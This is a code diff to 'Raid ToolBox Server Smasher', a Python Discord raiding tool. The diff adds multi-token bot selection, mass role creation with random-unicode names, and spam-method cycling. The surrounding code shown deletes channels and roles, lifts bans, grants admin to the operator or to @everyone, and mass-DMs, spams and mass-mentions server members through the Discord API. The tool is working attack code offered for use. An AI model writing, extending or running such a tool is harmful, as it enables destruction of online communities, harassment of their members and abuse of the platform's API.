@@ -1,3 +1,8 @@
+# Raid ToolBox Server Smasher
+# Author: DeadBread76 - https://github.com/DeadBread76/
+# Base code (Server Destroyer): Synchronocy - https://github.com/synchronocy
+# ThreadPool: Synchronocy - https://github.com/synchronocy
+
 try:
     import os
     import sys
@@ -10,6 +15,8 @@ try:
     import requests
     import pyperclip
     from smconfig import *
+    from tkinter import *
+    from tkinter.filedialog import *
     from colorama import init
     from termcolor import colored
     from discord import Permissions
@@ -23,11 +30,13 @@ except Exception as e:
 
 smversion = sys.argv[1]
 menucolour = sys.argv[2]
+Tk().withdraw()
 
 if sys.platform.startswith('win32'):
     ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Server Smasher v{}".format(smversion))
 elif sys.platform.startswith('linux'):
     sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Server Smasher v{}\x07".format(smversion))
+
 class Worker(Thread):
     """
     Pooling
@@ -85,10 +94,41 @@ client = discord.Client()
 
 if sys.platform.startswith('win32'):
     clear = lambda: os.system('cls')
+    os.system('mode con:cols=70 lines=35')
 elif sys.platform.startswith('linux'):
     clear = lambda: os.system('clear')
 init()
 
+if usemultiple == True:
+    useable = []
+    useabletokens = []
+    clear()
+    if sys.platform.startswith('win32'):
+        with open (".\\spammer\\smtokens.txt", "r") as handle:
+            tokens = handle.readlines()
+    elif sys.platform.startswith('linux'):
+        with open ("spammer/smtokens.txt", "r") as handle:
+            tokens = handle.readlines()
+    print ("Getting token info...")
+    for token in tokens:
+        apilink = 'https://discordapp.com/api/v6/users/@me'
+        headers = {'Authorization': "Bot " + token.rstrip(), 'Content-Type': 'application/json'}
+        src = requests.get(apilink, headers=headers)
+        if "401: Unauthorized" in str(src.content):
+            pass
+        else:
+            response = json.loads(src.content.decode())
+            useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
+            useabletokens.append(token.rstrip())
+    clear()
+    count = -1
+    print (colored("Select the Bot to use.\n-------------------------\n",menucolour))
+    for bot in useable:
+        count += 1
+        print(colored(str(count)+". "+bot,menucolour))
+    print (colored("\n-------------------------",menucolour))
+    botsel = input("\nBot of choice: ")
+    token = useabletokens[int(botsel)]
 
 #Attacks
 def deletechannel(channel):
@@ -121,7 +161,18 @@ def deleterole(role,server):
         time.sleep(3)
         deleterole(role,server)
 
-def senddmtouser(user,content):
+def createrole(name,server):
+    if clienttype == 'bot':
+        headers={ 'Authorization': 'Bot '+token}
+    else:
+        headers={ 'Authorization': token}
+    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
+    src = requests.post('https://ptb.discordapp.com/api/v6/guilds/'+str(server)+'/roles', headers=headers, json=payload)
+    if "You are being rate limited." in str(src.content):
+        time.sleep(3)
+        createrole(name,server)
+
+def senddmtouser(user,content,usetts):
     dmlist = []
     if clienttype == 'bot':
         headers={ 'Authorization': 'Bot '+token}
@@ -195,7 +246,7 @@ async def on_ready():
 
 async def serverselect():
     if sys.platform.startswith('win32'):
-        os.system('mode con:cols=70 lines=30')
+        os.system('mode con:cols=70 lines=35')
     serverlist = []
     clear()
     if clienttype == "bot":
@@ -216,6 +267,8 @@ async def serverselect():
     print('\n----------------------------------------')
     servernum = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Select the server to configure bot actions: ')
     try:
+        if int(servernum) == 0:
+            await serverselect()
         SERVER = serverlist[int(servernum)]
     except Exception:
         await serverselect()
@@ -223,7 +276,7 @@ async def serverselect():
 
 async def main(SERVER):
     if sys.platform.startswith('win32'):
-        os.system('mode con:cols=70 lines=30')
+        os.system('mode con:cols=70 lines=35')
     #options
     clear()
     server = client.get_guild(int(SERVER))
@@ -249,36 +302,40 @@ async def main(SERVER):
     print (colored(" 1. Configure then destroy. \n 2. Create Server Invite. \n 3. Change What the bot is playing. \n 4. Leave server. \n 5. Return to Server Select",menucolour))
     opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
     toggleopts = {
-        'namechange' : namechange,
-        'servname' : servname,
-        'iconbegone' : iconbegone,
-        'changeicon' : changeicon,
-        'iconfile' : iconfile,
-        'rembans' : rembans,
-        'chandel' : chandel,
-        'roledel' : roledel,
-        'userban' : userban,
-        'banreason' : banreason,
-        'userid' : userid,
-        'senddm' : senddm,
-        'dmcontent' : dmcontent,
-        'createchan' : createchan,
-        'chanmethod' : chanmethod,
-        'channame' : channame,
-        'channelno' : channelno,
-        'usespam' : usespam,
-        'spammethod' : spammethod,
-        'usetts' : usetts,
-        'customtxt' : customtxt,
-        'gimmieadmin' : gimmieadmin,
-        'me' : me,
-        'giveeveryoneadmin' : giveeveryoneadmin
+        'namechange': namechange,
+        'servname': servname,
+        'iconbegone': iconbegone,
+        'changeicon': changeicon,
+        'iconfile': iconfile,
+        'rembans': rembans,
+        'chandel': chandel,
+        'roledel': roledel,
+        'userban': userban,
+        'banreason': banreason,
+        'userid': userid,
+        'senddm': senddm,
+        'dmcontent': dmcontent,
+        'createchan': createchan,
+        'chanmethod': chanmethod,
+        'channame': channame,
+        'channelno': channelno,
+        'usespam': usespam,
+        'spammethod': spammethod,
+        'usetts': usetts,
+        'customtxt': customtxt,
+        'gimmieadmin': gimmieadmin,
+        'me': me,
+        'giveeveryoneadmin': giveeveryoneadmin,
+        'createroles': createroles,
+        'crolecount': crolecount,
+        'rolesname': rolesname,
+        'custrolename': custrolename
         }
     try:
         if int(opts) == 1:
             async def changesettings(toggleopts,SERVER):
                 if sys.platform.startswith('win32'):
-                    os.system('mode con:cols=70 lines=30')
+                    os.system('mode con:cols=70 lines=35')
                 try:
                     clear()
                     server = client.get_guild(int(SERVER))
@@ -308,6 +365,10 @@ async def main(SERVER):
                     print (colored("22. Give yourself admin: {}".format(toggleopts['gimmieadmin']),menucolour))
                     print (colored("23. Your ID: {}".format(toggleopts['me']),menucolour))
                     print (colored("24. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),menucolour))
+                    print (colored("25. Create Roles: {}".format(toggleopts['createroles']),menucolour))
+                    print (colored("26. Number of roles to create: {}".format(toggleopts['crolecount']),menucolour))
+                    print (colored("27. Role Creation type: {}".format(toggleopts['rolesname']),menucolour))
+                    print (colored("28. Name of roles: {}".format(toggleopts['custrolename']),menucolour))
                     toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                     if toga.lower() == "start":
                         for channel in server.channels:
@@ -318,9 +379,10 @@ async def main(SERVER):
                                 print (colored("You do not have the permissions to destroy this server.","red"))
                                 con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
                                 if con.lower() == 'y':
-                                    pass
+                                    break
                                 else:
                                     await main(SERVER)
+
                         if toggleopts['chandel'] == True:
                             print('Deleting channels.')
                             for channel in server.channels:
@@ -340,18 +402,14 @@ async def main(SERVER):
                         if toggleopts['rembans'] == True:
                             print ("Removing bans.")
                             bans = await server.bans()
-                            print (bans)
                             for ban in bans:
                                 for user in ban:
-                                    try:
-                                        pool.add_task(removeban,str(server.id),str(user.id))
-                                    except Exception:
-                                        pass
+                                    pool.add_task(removeban,str(server.id),str(user.id))
 
                         if toggleopts['senddm'] == True:
                             for user in server.members:
                                 print (colored('Sending DM to ' + user.name,"blue"))
-                                pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'])
+                                pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'],toggleopts['usetts'])
                             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['namechange'] == True:
@@ -364,11 +422,7 @@ async def main(SERVER):
 
                         if toggleopts['changeicon'] == True:
                             print('Changing icon...')
-                            if sys.platform.startswith('win32'):
-                                icofile = ".\\spammer\\serversmasher\\" + toggleopts['iconfile']
-                            elif sys.platform.startswith('linux'):
-                                icofile = "spammer/serversmasher/" + toggleopts['iconfile']
-                            with open(icofile, 'rb') as handle:
+                            with open(toggleopts['iconfile'], 'rb') as handle:
                                 icon = handle.read()
                                 await server.edit(icon=icon)
 
@@ -410,8 +464,21 @@ async def main(SERVER):
                                 if toggleopts['chanmethod'].lower() == "voice":
                                     pool.add_task(createchannel,SERVER,toggleopts['channame'],"voice")
                             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-
                             print ('Channels Created.')
+
+                        if toggleopts['createroles'] == True:
+                            print('Creating roles.')
+                            for x in range(int(toggleopts['crolecount'])):
+                                if toggleopts['rolesname'] == "set":
+                                    pool.add_task(createrole,toggleopts['custrolename'],server.id)
+
+                                if toggleopts['rolesname'] == "ascii":
+                                    asc = ""
+                                    for x in range(60):
+                                        num = random.randrange(13000)
+                                        asc = asc + chr(num)
+                                    pool.add_task(createrole,asc,server.id)
+                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['chanmethod'].lower() == "voice":
                             if toggleopts['chandel'] == True:
@@ -457,7 +524,7 @@ async def main(SERVER):
                             toggleopts['changeicon'] = True
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 5:
-                        toggleopts['iconfile'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of the icon: ')
+                        toggleopts['iconfile'] = askopenfilename(initialdir = os.getcwd(),title = "Select server icon")
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 6:
                         if toggleopts['rembans'] == True:
@@ -488,8 +555,11 @@ async def main(SERVER):
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 11:
                         appen = input ("Username and Descriminator: ")
-                        toggleopts['userid'].append(appen)
-                        await changesettings(toggleopts,SERVER)
+                        if appen == '':
+                            await changesettings(toggleopts,SERVER)
+                        else:
+                            toggleopts['userid'].append(appen)
+                            await changesettings(toggleopts,SERVER)
                     elif int(toga) == 12:
                         if toggleopts['senddm'] == True:
                             toggleopts['senddm'] = False
@@ -506,7 +576,12 @@ async def main(SERVER):
                             toggleopts['createchan'] = True
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 15:
-                        toggleopts['chanmethod']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Channel Creation method (set,ascii,voice): ')
+                        if toggleopts['chanmethod'] == "set":
+                            toggleopts['chanmethod'] = "ascii"
+                        elif toggleopts['chanmethod'] == "ascii":
+                            toggleopts['chanmethod'] = "voice"
+                        elif toggleopts['chanmethod'] == "voice":
+                            toggleopts['chanmethod'] = "set"
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 16:
                         toggleopts['channame']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created channels: ')
@@ -521,7 +596,14 @@ async def main(SERVER):
                             toggleopts['usespam'] = True
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 19:
-                        toggleopts['spammethod']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Spamming method (text,asc,everyone): ')
+                        if toggleopts['spammethod'] == "text":
+                            toggleopts['spammethod'] = "asc"
+                        elif toggleopts['spammethod'] == "asc":
+                            toggleopts['spammethod'] = "everyone"
+                        elif toggleopts['spammethod'] == "everyone":
+                            toggleopts['spammethod'] = "massment"
+                        elif toggleopts['spammethod'] == "massment":
+                            toggleopts['spammethod'] = "text"
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 20:
                         toggleopts['customtxt'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Text to spam: ')
@@ -546,6 +628,28 @@ async def main(SERVER):
                             toggleopts['giveeveryoneadmin'] = False
                         else:
                             toggleopts['giveeveryoneadmin'] = True
+                        await changesettings(toggleopts,SERVER)
+                    elif int(toga) == 25:
+                        if toggleopts['createroles'] == True:
+                            toggleopts['createroles'] = False
+                        else:
+                            toggleopts['createroles'] = True
+                        await changesettings(toggleopts,SERVER)
+                    elif int(toga) == 26:
+                        toggleopts['crolecount'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Roles to create: ')
+                        await changesettings(toggleopts,SERVER)
+                    elif int(toga) == 27:
+                        if toggleopts['rolesname'] == 'set':
+                            toggleopts['rolesname'] = 'ascii'
+                        else:
+                            toggleopts['rolesname'] = 'set'
+                        await changesettings(toggleopts,SERVER)
+                    elif int(toga) == 28:
+                        toggleopts['custrolename'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created roles: ')
+                        await changesettings(toggleopts,SERVER)
+                    else:
+                        print ("Invalid option")
+                        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                         await changesettings(toggleopts,SERVER)
                 except Exception as e:
                     print (e)
@@ -610,7 +714,7 @@ async def mass_tag(SERVER,usetts):
             for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                 pool.add_task(sendspam,str(channel.id),m,usetts)
 
-async def ascii_spam(SERVER,usetts):
+async def ascii_spam(SERVER,usetts): # "oh god you scrambled that server"
     await asyncio.sleep(5)
     server = client.get_guild(int(SERVER))
     await client.wait_until_ready()
